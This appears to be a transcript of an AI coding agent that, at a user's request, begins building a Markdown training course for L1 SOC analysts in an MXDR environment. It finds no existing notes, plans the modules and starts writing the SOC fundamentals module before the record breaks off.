# New session - 2026-08-07T21:47:07.646Z

**Session ID:** ses_021ce4a01ffe3VdQ6TmgY1O6T5
**Created:** 8/8/2026, 12:47:07 AM
**Updated:** 8/8/2026, 8:02:13 AM

---

## User

You are an expert SOC, MXDR, XDR, SIEM, EDR, incident response, threat detection, threat hunting, Windows security, Active Directory, network security, and cybersecurity instructor.

I am preparing for an L1 SOC Analyst interview and potentially an L1 SOC role in an MXDR environment.

Your job is to create a COMPLETE, structured, practical "MXDR L1 SOC Crash Course" from beginner fundamentals through advanced L1-level operational knowledge.

IMPORTANT:
I already have a collection of Markdown study notes in this project/folder. DO NOT blindly rewrite them and DO NOT assume they are complete.

First:
1. Inspect every existing .md/.canvas/text study file in the project.
2. Identify what topics are already covered.
3. Identify duplicate topics.
4. Identify missing topics.
5. Identify topics that are too shallow.
6. Identify topics that are unnecessarily advanced for an L1 SOC analyst.
7. Preserve useful existing material while improving structure and filling gaps.
8. Create a coherent curriculum rather than a random collection of cybersecurity notes.

The final curriculum must prioritize what an L1 SOC analyst actually needs in a real MXDR/SOC environment.

==================================================
CORE OBJECTIVE
==================================================

The end goal is that after studying this material I can:

- Understand how an MXDR/SOC environment operates.
- Understand the role and responsibilities of an L1 SOC analyst.
- Read and interpret security alerts.
- Perform alert triage.
- Distinguish events, alerts, incidents, and cases.
- Determine false positive vs true positive.
- Investigate suspicious users, hosts, IPs, domains, processes, files, and authentication activity.
- Read Windows security logs.
- Understand Sysmon telemetry.
- Analyze PowerShell activity.
- Understand Active Directory and authentication.
- Understand Kerberos and NTLM.
- Investigate suspicious authentication.
- Understand endpoint telemetry and process trees.
- Understand EDR/XDR concepts.
- Understand SIEM correlation.
- Understand network security fundamentals.
- Analyze DNS, HTTP/HTTPS, TLS, VPN, firewall, proxy, and common network activity.
- Understand malware behavior.
- Understand phishing.
- Understand common attack techniques.
- Map activity to MITRE ATT&CK.
- Perform basic threat intelligence research.
- Understand IOC/IOA/TTP concepts.
- Know when and how to escalate an incident.
- Understand severity, priority, SLA and escalation procedures.
- Communicate an incident clearly in a ticket/case.
- Reason through realistic SOC scenarios without blindly following alerts.

==================================================
MODULE 0 — SOC AND MXDR FUNDAMENTALS
==================================================

Teach:

- What is a SOC?
- Why SOCs exist
- SOC architecture
- SOC people/process/technology model
- L1 SOC Analyst
- L2 SOC Analyst
- L3 SOC Analyst
- SOC Manager
- Detection Engineer
- Threat Hunter
- Incident Responder
- Security Engineer
- Typical L1 workflow
- Shift-based SOC operations
- 24/7 SOC
- Follow-the-sun SOC
- Ticketing/case management
- Escalation procedures
- SLA
- Severity
- Priority
- Impact
- Urgency

Explain:

Event → Alert → Triage → Investigation → Incident → Escalation → Response → Closure → Documentation

Explain the difference between:

- Event
- Alert
- Detection
- Incident
- Case
- Finding
- IOC
- IOA
- TTP

==================================================
MODULE 1 — MDR / XDR / MXDR
==================================================

Explain in depth:

- MDR
- XDR
- MXDR
- SIEM
- EDR
- NDR
- SOAR
- UEBA
- Threat Intelligence Platform
- Security data lake
- Log management

Explain the differences between:

- SIEM vs XDR
- EDR vs XDR
- MDR vs MXDR
- EDR vs Antivirus
- SIEM vs SOAR
- NDR vs EDR
- SOC vs MDR
- SOC vs MXDR

Explain how all of these can work together.

Provide a realistic MXDR architecture:

Endpoint
→ EDR
→ XDR/SIEM
→ Correlation/Detection
→ MXDR platform
→ SOC L1
→ SOC L2
→ Incident Response

==================================================
MODULE 2 — ALERT TRIAGE
==================================================

This is one of the MOST IMPORTANT modules.

Teach a complete alert investigation methodology.

For every alert explain:

1. What triggered it?
2. Which asset is involved?
3. Which user is involved?
4. What happened?
5. When did it happen?
6. What process caused it?
7. What parent process spawned it?
8. What command line was executed?
9. What network connections occurred?
10. What files were created/modified?
11. What authentication occurred?
12. What happened before the alert?
13. What happened after the alert?
14. Is there evidence of persistence?
15. Is there lateral movement?
16. Is there C2?
17. Is there data exfiltration?
18. Is it malicious, benign, or inconclusive?
19. What evidence supports the conclusion?
20. Should it be escalated?

Teach:

- Alert enrichment
- Context gathering
- Timeline construction
- User context
- Asset criticality
- Process context
- Network context
- Authentication context
- Threat intelligence enrichment
- IOC enrichment
- Correlation
- Evidence collection
- Root cause analysis basics

Explain:

False Positive
True Positive
Benign Positive
Suspicious / Inconclusive

==================================================
MODULE 3 — INCIDENT SEVERITY AND ESCALATION
==================================================

Teach how an L1 analyst determines:

- Severity
- Priority
- Impact
- Urgency
- Confidence

Explain why these are not necessarily the same thing.

Teach escalation criteria.

Examples:

- Domain Controller compromise
- Privileged account compromise
- Ransomware
- Malware on workstation
- Phishing email
- Failed login spike
- Successful login after brute force
- Suspicious PowerShell
- C2 communication
- Data exfiltration

Explain what should be escalated immediately vs investigated further.

==================================================
MODULE 4 — WINDOWS SECURITY
==================================================

Teach Windows security from an SOC analyst perspective.

Cover:

- Windows architecture basics
- Users
- Groups
- Services
- Processes
- Registry
- Scheduled Tasks
- WMI
- PowerShell
- Windows Defender
- Windows Firewall
- Windows Event Logs
- Event Viewer

Cover important Event IDs:

- 4624
- 4625
- 4634
- 4647
- 4672
- 4688
- 4698
- 4720
- 4728
- 4732
- 4768
- 4769
- 4771
- 4776
- 1102
- 7045

For each important Event ID explain:

- What it means
- Why SOC analysts care
- What suspicious behavior looks like
- Example scenario
- What other logs should be correlated with it

==================================================
MODULE 5 — SYSMON
==================================================

Teach Sysmon from an analyst perspective.

Cover important Sysmon Event IDs:

- Process Create
- Network Connection
- File Create
- Registry events
- DNS Query
- Process Access
- CreateRemoteThread
- Image Load

Explain process trees.

Explain:

Parent Process
Child Process
Command Line
Image Path
Hash
User
Integrity Level

Provide realistic examples such as:

winword.exe
→ powershell.exe
→ cmd.exe
→ rundll32.exe

and explain why the chain may be suspicious.

==================================================
MODULE 6 — POWERSHELL SECURITY
==================================================

Teach:

- PowerShell basics
- PowerShell execution
- Encoded commands
- Base64
- Execution policy
- PowerShell logging
- Script Block Logging
- Module Logging
- AMSI
- PowerShell download cradles
- Obfuscation
- LOLBins

Explain how an L1 analyst investigates suspicious PowerShell.

Provide realistic alert examples.

==================================================
MODULE 7 — ACTIVE DIRECTORY
==================================================

Teach:

- Active Directory
- Domain
- Domain Controller
- Users
- Groups
- Organizational Units
- Group Policy
- Service Accounts
- Privileged Accounts
- Domain Admins
- Machine Accounts
- LDAP
- DNS in AD

Explain:

Authentication vs Authorization

==================================================
MODULE 8 — KERBEROS AND NTLM
==================================================

Teach Kerberos thoroughly but practically.

Cover:

- Authentication flow
- AS-REQ
- AS-REP
- TGT
- TGS
- SPN
- Service accounts
- KDC
- Domain Controller

Teach:

- Kerberoasting
- AS-REP Roasting
- Pass-the-Ticket
- Golden Ticket
- Silver Ticket

Teach NTLM:

- NTLM basics
- NTLM authentication
- NTLM relay
- Pass-the-Hash
- NTLM vs Kerberos

Explain the relevant Windows Event IDs.

==================================================
MODULE 9 — NETWORKING FOR SOC
==================================================

Teach:

- OSI model
- TCP/IP
- TCP
- UDP
- TCP three-way handshake
- IP
- ICMP
- ARP
- MAC
- Routing
- NAT
- DHCP
- DNS
- HTTP
- HTTPS
- TLS
- VPN
- Proxy
- Firewall
- IDS
- IPS
- NDR

Teach common ports:

21 FTP
22 SSH
23 Telnet
25 SMTP
53 DNS
80 HTTP
110 POP3
143 IMAP
389 LDAP
443 HTTPS
445 SMB
3389 RDP

Explain why each matters to SOC analysts.

==================================================
MODULE 10 — DNS SECURITY
==================================================

Teach:

- DNS resolution
- A
- AAAA
- CNAME
- MX
- TXT
- NS
- PTR
- DNS caching
- DNS over HTTPS basics
- DNS tunneling
- Domain generation algorithms
- Suspicious domains
- Fast flux

Teach how to investigate suspicious DNS activity.

==================================================
MODULE 11 — HTTP / HTTPS / TLS
==================================================

Teach:

- HTTP request/response
- Methods
- Headers
- User-Agent
- Cookies
- Status codes
- GET
- POST
- PUT
- DELETE
- 200
- 301
- 302
- 400
- 401
- 403
- 404
- 500

Explain:

- TLS basics
- Certificates
- HTTPS visibility
- Proxy logs

==================================================
MODULE 12 — NETWORK TRAFFIC ANALYSIS
==================================================

Teach:

- Network flows
- Source IP
- Destination IP
- Source port
- Destination port
- Protocol
- Connection frequency
- Beaconing
- C2
- Data transfer
- Suspicious outbound traffic

Introduce:

- PCAP
- Wireshark
- tcpdump

Explain what an L1 analyst should look for.

==================================================
MODULE 13 — ENDPOINT SECURITY
==================================================

Teach:

- Antivirus
- EPP
- EDR
- XDR
- Endpoint telemetry
- Process telemetry
- File telemetry
- Registry telemetry
- Network telemetry
- User telemetry

Explain:

- Signature detection
- Behavioral detection
- Heuristic detection
- Process trees
- Command lines
- File hashes
- Parent/child relationships

==================================================
MODULE 14 — MALWARE
==================================================

Teach:

- Virus
- Worm
- Trojan
- RAT
- Ransomware
- Spyware
- Rootkit
- Loader
- Dropper
- Downloader
- Backdoor
- Web shell

Teach malware lifecycle:

Initial Access
→ Execution
→ Persistence
→ Privilege Escalation
→ Defense Evasion
→ C2
→ Collection
→ Exfiltration
→ Impact

Explain:

- Static analysis
- Dynamic analysis
- Sandbox
- Hashes
- PE files
- Strings
- Imports
- Basic malware triage

==================================================
MODULE 15 — COMMAND AND CONTROL
==================================================

Teach:

- C2
- Beaconing
- Callback
- HTTP C2
- HTTPS C2
- DNS C2
- TCP C2
- Domain fronting concept
- Periodic communication
- Long-lived connections
- Suspicious outbound traffic

Explain how to recognize C2 behavior in logs.

==================================================
MODULE 16 — PHISHING AND EMAIL SECURITY
==================================================

Teach:

- Phishing
- Spear phishing
- Whaling
- Business Email Compromise
- Malicious attachment
- Malicious URL
- Credential phishing
- QR phishing

Teach email investigation:

- Sender
- Recipient
- Reply-To
- Return-Path
- Received headers
- SPF
- DKIM
- DMARC
- URL
- Domain
- Attachment
- Hash
- Reputation

==================================================
MODULE 17 — THREAT INTELLIGENCE
==================================================

Teach:

- IOC
- IOA
- TTP
- IP reputation
- Domain reputation
- Hash reputation
- WHOIS
- DNS intelligence
- Threat feeds
- Malware reputation
- Threat actors
- Campaigns
- Malware families

Explain how an L1 analyst uses threat intelligence during alert triage.

==================================================
MODULE 18 — MITRE ATT&CK
==================================================

Teach the entire ATT&CK lifecycle conceptually:

- Reconnaissance
- Resource Development
- Initial Access
- Execution
- Persistence
- Privilege Escalation
- Defense Evasion
- Credential Access
- Discovery
- Lateral Movement
- Collection
- Command and Control
- Exfiltration
- Impact

For each tactic provide important techniques relevant to SOC L1.

Especially cover:

- PowerShell
- RDP
- SMB
- Scheduled Tasks
- Service Execution
- Credential Dumping
- Kerberoasting
- Pass-the-Hash
- Pass-the-Ticket
- Windows Management Instrumentation
- Command and Scripting Interpreter
- Valid Accounts

Explain MITRE mapping of alerts.

==================================================
MODULE 19 — COMMON ATTACKS
==================================================

Teach practical detection/triage concepts for:

- Brute Force
- Password Spraying
- Credential Stuffing
- Phishing
- Malware
- Ransomware
- SQL Injection
- XSS
- IDOR
- LFI
- RFI
- SSRF
- CSRF
- Command Injection
- Path Traversal
- Web Shell
- DDoS
- DoS
- ARP Spoofing
- DNS Tunneling
- DNS Poisoning
- Man-in-the-Middle
- Lateral Movement
- Privilege Escalation
- Credential Dumping
- Data Exfiltration

==================================================
MODULE 20 — WEB SECURITY
==================================================

Cover:

- SQL Injection
- XSS
- IDOR
- LFI
- RFI
- SSRF
- CSRF
- Command Injection
- Path Traversal
- Authentication attacks
- Session hijacking
- JWT basics
- Web shells

For every attack explain:

- What it is
- How it works conceptually
- What logs may reveal it
- What an L1 analyst should look for
- Example alert
- Example investigation

==================================================
MODULE 21 — LINUX SECURITY
==================================================

Teach:

- Linux processes
- Users
- Permissions
- sudo
- SSH
- Cron
- systemd
- Persistence
- `/var/log/auth.log`
- `/var/log/syslog`
- journalctl
- ps
- ss
- netstat
- lsof
- grep

Teach Linux brute force and suspicious process investigation.

==================================================
MODULE 22 — SOAR AND AUTOMATION
==================================================

Teach:

- SOAR
- Playbooks
- Automated enrichment
- Automated containment
- Automated blocking
- Ticket creation
- IOC enrichment
- Approval workflows

Explain when automation is safe and when human validation is required.

==================================================
MODULE 23 — QUERY AND LOG ANALYSIS
==================================================

Teach general log analysis concepts:

- Filtering
- Searching
- Aggregation
- Correlation
- Grouping
- Sorting
- Time windows
- Field extraction
- Regex
- Timestamps
- Timezones

Introduce:

- KQL
- SPL
- SQL

Provide beginner SOC-oriented examples.

==================================================
MODULE 24 — INCIDENT RESPONSE
==================================================

Teach:

- Preparation
- Detection
- Analysis
- Containment
- Eradication
- Recovery
- Lessons Learned

Explain the role of L1 in incident response.

Explain when L1 should NOT attempt independent remediation.

==================================================
MODULE 25 — FORENSICS BASICS
==================================================

Teach only the level relevant to L1:

- Evidence
- Chain of custody concept
- Timeline
- File metadata
- Process artifacts
- Network artifacts
- Browser artifacts
- Windows artifacts
- MFT basics
- Prefetch basics
- Amcache basics
- Registry basics

Do not turn this into a full digital forensics course.

==================================================
MODULE 26 — SECURITY PRODUCTS
==================================================

Explain categories and differences between:

- Antivirus
- EPP
- EDR
- XDR
- NDR
- SIEM
- SOAR
- Firewall
- IDS
- IPS
- WAF
- DLP
- Email Security
- IAM
- PAM

Focus on what telemetry each product produces and how an SOC analyst uses it.

==================================================
MODULE 27 — CLOUD SECURITY BASICS
==================================================

Teach enough cloud security for an L1 SOC analyst:

- IAM
- Cloud authentication
- Cloud audit logs
- AWS CloudTrail concept
- Azure activity logs
- Microsoft Entra ID concept
- Cloud storage exposure
- Cloud security alerts
- Suspicious cloud logins
- Impossible travel
- MFA anomalies

==================================================
MODULE 28 — REAL SOC CASE STUDIES
==================================================

Create realistic cases.

At minimum:

1. Brute force → successful login
2. Password spraying
3. Suspicious PowerShell
4. Malicious Office document
5. Phishing email
6. Malware execution
7. C2 beaconing
8. Ransomware behavior
9. Suspicious RDP
10. Lateral movement
11. Pass-the-Hash
12. Kerberoasting
13. Golden Ticket
14. DNS tunneling
15. Data exfiltration
16. Suspicious privileged account activity
17. Impossible travel
18. Endpoint compromise
19. Web attack
20. False positive

For every case provide:

- Alert
- Initial evidence
- Available telemetry
- Investigation steps
- Questions the analyst should ask
- Expected findings
- True/False Positive determination
- Severity
- Escalation decision
- MITRE ATT&CK mapping
- Example SOC ticket

==================================================
MODULE 29 — INTERVIEW PREPARATION
==================================================

Create a dedicated L1 SOC/MXDR interview section.

Include:

### Fundamental questions
- What is SOC?
- What is SIEM?
- What is XDR?
- What is MXDR?
- What is EDR?
- What is MDR?
- What is SOAR?
- What is IOC?
- What is IOA?
- What is MITRE ATT&CK?

### Technical questions
- Explain TCP three-way handshake.
- What happens during DNS resolution?
- Difference between TCP and UDP.
- What is Kerberos?
- What is NTLM?
- What is a TGT?
- What is a TGS?
- What is Kerberoasting?
- What is Pass-the-Hash?
- What is Golden Ticket?
- What is PowerShell?
- What is Sysmon?
- What is a process tree?
- What is C2?
- What is DNS tunneling?

### Scenario questions

Create at least 50 realistic scenario questions.

Examples:

"A user has 40 failed logins followed by a successful login from a different country. What do you do?"

"PowerShell executed with an encoded command. What do you investigate?"

"winword.exe spawned powershell.exe. What does this suggest?"

"An endpoint communicates with a known malicious IP every 60 seconds. What do you do?"

"An admin account logs in from two countries within 10 minutes. What do you investigate?"

"An EDR alert says ransomware behavior detected. What is your first action?"

For each scenario provide:

- Strong answer
- Weak answer
- Common mistake
- Follow-up question interviewer may ask

==================================================
MODULE 30 — PRACTICAL LABS
==================================================

Create hands-on exercises.

Examples:

- Read Windows Event IDs
- Analyze failed logins
- Identify brute force
- Analyze PowerShell command lines
- Analyze process trees
- Analyze DNS logs
- Analyze HTTP logs
- Analyze phishing headers
- Analyze a suspicious hash
- Map activity to MITRE
- Investigate a suspicious IP
- Write a SOC incident ticket
- Determine severity
- Determine escalation path

Whenever possible provide realistic fake logs.

==================================================
MODULE 31 — SOC TICKETING
==================================================

Teach how to write professional SOC cases.

Include:

- Summary
- Detection
- Timestamp
- Affected user
- Affected host
- Source IP
- Destination IP
- IOC
- Evidence
- Investigation
- Findings
- MITRE ATT&CK
- Severity
- Recommended action
- Escalation
- Analyst notes

Provide good and bad ticket examples.

==================================================
MODULE 32 — ADVANCED BUT OPTIONAL
==================================================

Briefly introduce:

- APT
- Threat Hunting
- Detection Engineering
- Sigma
- YARA
- Suricata
- Snort
- KQL advanced
- SPL advanced
- Memory forensics
- Reverse engineering
- Malware analysis advanced
- Cloud detection engineering

Clearly label these as beyond normal L1 requirements.

==================================================
TEACHING REQUIREMENTS
==================================================

Do NOT simply dump definitions.

For every important concept use:

1. Simple explanation
2. Technical explanation
3. Why an L1 SOC analyst cares
4. Real-world example
5. Example alert/log
6. Investigation approach
7. Common mistakes
8. MITRE ATT&CK relationship when applicable

Use tables where useful.

Use diagrams where useful.

Use realistic logs rather than generic toy examples.

Always connect theory to:

"An alert comes in. What does the analyst actually do?"

==================================================
CURRICULUM PRIORITY
==================================================

Rank topics as:

P0 = Must know before L1 interview
P1 = Important for first months on the job
P2 = Useful advanced knowledge
P3 = Optional / specialized

Do NOT spend excessive time on advanced offensive security techniques while neglecting:

- Alert triage
- Windows logs
- Authentication
- EDR
- SIEM
- Network fundamentals
- Incident handling
- Escalation
- SOC workflow

==================================================
FINAL OUTPUT
==================================================

After analyzing the existing study files, produce:

1. Complete curriculum
2. Missing topic list
3. Duplicate topic list
4. Topics that need expansion
5. Recommended study order
6. P0/P1/P2/P3 classification
7. Detailed course notes
8. Practical labs
9. Realistic SOC scenarios
10. 50+ interview questions
11. 50+ scenario questions
12. Cheat sheets
13. Windows Event ID cheat sheet
14. Common ports cheat sheet
15. MITRE ATT&CK cheat sheet
16. IOC/IOA/TTP cheat sheet
17. SIEM/EDR/XDR/MXDR comparison
18. Incident severity cheat sheet
19. SOC escalation cheat sheet
20. Final L1 SOC readiness checklist

IMPORTANT:
The final result should feel like a real internal SOC/MXDR training curriculum, not a generic cybersecurity tutorial.

Assume the learner already understands basic programming and general computer concepts.

Do not waste time explaining extremely basic concepts such as what a computer or operating system is.

Prioritize practical SOC reasoning.

The ultimate question behind every module should be:

"If an alert appears in an MXDR platform at 03:00 and I am the L1 analyst, do I know what to look at, what to investigate, what evidence to collect, what decision to make, and when to escalate?"

If the answer is no, expand that section until it becomes actionable. Save those answers as .md file

---

## Assistant (Build · Nemotron 3 Ultra (free) · 4.8s)

_Thinking:_

The user wants me to create a comprehensive MXDR L1 SOC Crash Course curriculum. First, I need to inspect the existing study files in the project to understand what's already covered, identify gaps, and then create a structured curriculum.

Let me start by exploring the project directory to find all existing .md/.canvas/text files.

**Tool: glob**

**Input:**
```json
{
  "pattern": "**/*.{md,canvas,txt}"
}
```

**Output:**
```
No files found
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 3.0s)

_Thinking:_

No existing study files found. The user mentioned they have a collection of Markdown study notes, but the glob search found none. Let me check the working directory more broadly.

**Tool: bash**

**Input:**
```json
{
  "command": "ls -la /Users/n0rthstar/Desktop/adsız\\ klasör/"
}
```

**Output:**
```
total 0
drwxr-xr-x   2 n0rthstar  staff   64  8 Ağu 00:44 .
drwx------@ 10 n0rthstar  staff  320  8 Ağu 00:44 ..

```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 20.1s)

_Thinking:_

The directory is empty. There are no existing study files. The user mentioned they have a collection of Markdown study notes, but the project folder is empty. I'll need to create the entire curriculum from scratch.

Let me create a comprehensive MXDR L1 SOC Crash Course as specified. I'll create it as a structured set of Markdown files organized by modules.

The project folder is empty. I'll create the complete MXDR L1 SOC Crash Course curriculum from scratch as structured Markdown files.


**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "status": "in_progress",
      "priority": "high"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "status": "pending",
      "priority": "medium"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "status": "pending",
      "priority": "medium"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "status": "pending",
      "priority": "medium"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 20 - Web Security",
      "status": "pending",
      "priority": "medium"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "status": "pending",
      "priority": "medium"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "status": "pending",
      "priority": "medium"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "status": "pending",
      "priority": "medium"
    },
    {
      "content": "Create Module 26 - Security Products",
      "status": "pending",
      "priority": "medium"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "status": "pending",
      "priority": "medium"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "status": "pending",
      "priority": "low"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "status": "pending",
      "priority": "high"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "status": "pending",
      "priority": "high"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 9.7s)

_Thinking:_

Now let me create the curriculum. I'll start with Module 0 and work through all modules systematically. I'll create them as individual markdown files for better organization.

**Tool: bash**

**Input:**
```json
{
  "command": "mkdir -p /Users/n0rthstar/Desktop/adsız\\ klasör/mxdr-l1-soc-crash-course/{modules,cheatsheets,labs,case-studies,interview}"
}
```

**Output:**
```
(no output)
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 105.9s)

_Thinking:_

Good, the directories are created. Now I'll start creating the modules. Let me begin with Module 0 - SOC and MXDR Fundamentals.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 0: SOC and MXDR Fundamentals\n\n**Priority: P0 — Must know before L1 interview**\n\n---\n\n## 0.1 What is a SOC?\n\n### Simple Explanation\nA Security Operations Center (SOC) is a centralized unit that monitors, detects, analyzes, and responds to cybersecurity threats 24/7. It's the \"mission control\" for an organization's security posture.\n\n### Technical Explanation\nA SOC combines people, processes, and technology to continuously monitor and improve an organization's security posture while preventing, detecting, analyzing, and responding to cybersecurity incidents. It operates as a centralized function using SIEM, EDR, NDR, threat intelligence, and SOAR platforms to correlate telemetry across the environment.\n\n### Why SOCs Exist\n- **Continuous monitoring**: Threats don't keep business hours\n- **Rapid detection**: Reduce dwell time (average 200+ days without SOC)\n- **Centralized visibility**: Single pane of glass across hybrid environments\n- **Compliance**: Regulatory requirements (SOX, PCI-DSS, HIPAA, GDPR)\n- **Incident response coordination**: Structured response vs ad-hoc chaos\n\n### SOC Architecture\n```\n┌─────────────────────────────────────────────────────────────┐\n                      DATA SOURCES\n  Endpoints  │  Network  │  Cloud  │  Identity  │  Applications\n  (EDR)      │  (NDR)    │  (CSPM) │  (AD/Entra)│  (WAF/Email)\n└──────────────────────────┬────────────────────────────────────┘\n                           ▼\n┌─────────────────────────────────────────────────────────────┐\n                      INGESTION & NORMALIZATION\n              (Syslog, API, Agents, Forwarders)\n└──────────────────────────┬────────────────────────────────────┘\n                           ▼\n┌─────────────────────────────────────────────────────────────┐\n                         SIEM / XDR PLATFORM\n              Correlation │ Enrichment │ Detection\n                         │  Rules     │  Analytics\n                         │  ML/AI     │  Threat Intel\n└──────────────────────────┬────────────────────────────────────┘\n                           ▼\n┌─────────────────────────────────────────────────────────────┐\n                        SOC TIERED OPERATIONS\n    L1 Triage ──► L2 Investigation ──► L3 Hunt/IR ──► Mgmt\n└─────────────────────────────────────────────────────────────┘\n```\n\n---\n\n## 0.2 People / Process / Technology Model\n\n| Pillar | Components |\n|--------|------------|\n| **People** | L1/L2/L3 Analysts, Detection Engineers, Threat Hunters, Incident Responders, SOC Manager, Security Engineers |\n| **Process** | Alert triage, escalation, incident response, shift handover, SLA management, runbooks, playbooks |\n| **Technology** | SIEM, EDR/XDR, NDR, SOAR, TIP, Vulnerability Management, Asset Inventory, Case Management |\n\n---\n\n## 0.3 SOC Roles and Responsibilities\n\n### L1 SOC Analyst (Tier 1) — **YOUR TARGET ROLE**\n| Responsibility | Description |\n|----------------|-------------|\n| **Alert Triage** | First responder to alerts; enrich, correlate, classify (TP/FP/BP) |\n| **Initial Investigation** | Gather context: user, host, process, network, auth, timeline |\n| **Ticket Creation** | Document findings in case management (ServiceNow, Jira, TheHive) |\n| **Escalation** | Escalate true positives to L2 with complete context |\n| **Basic Containment** | Execute approved playbooks: block IP, isolate host, disable account |\n| **Shift Handover** | Document open cases, pending actions, unresolved alerts |\n| **Log Review** | Proactive log review during quiet periods |\n\n**Key Skills**: Windows Event Logs, 